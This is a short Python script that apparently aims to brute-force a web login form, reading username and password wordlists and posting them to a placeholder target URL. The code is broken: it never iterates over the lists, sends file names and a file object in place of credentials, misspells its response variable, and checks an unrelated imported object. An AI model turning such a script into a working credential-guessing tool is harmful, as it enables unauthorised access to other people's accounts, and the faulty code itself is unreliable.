from urllib import response
import requests

target_url = "$target_url"
username_file = "users.txt"
password_file = "passwords.txt"

with open(username_file, "r") as file:
    usernames = file.read().splitlines()
    password_file = open(password_file, "r")
    passwords = password_file.read().splitlines()
    reponse = requests.post(target_url, data={"username": username_file, "password": password_file})

    if response.status_code == 200:
        print("[+] Valid credentials: " + username_file + " " + password_file)
    else:
        print("[-] Invalid credentials: " + username_file + " " + password_file)
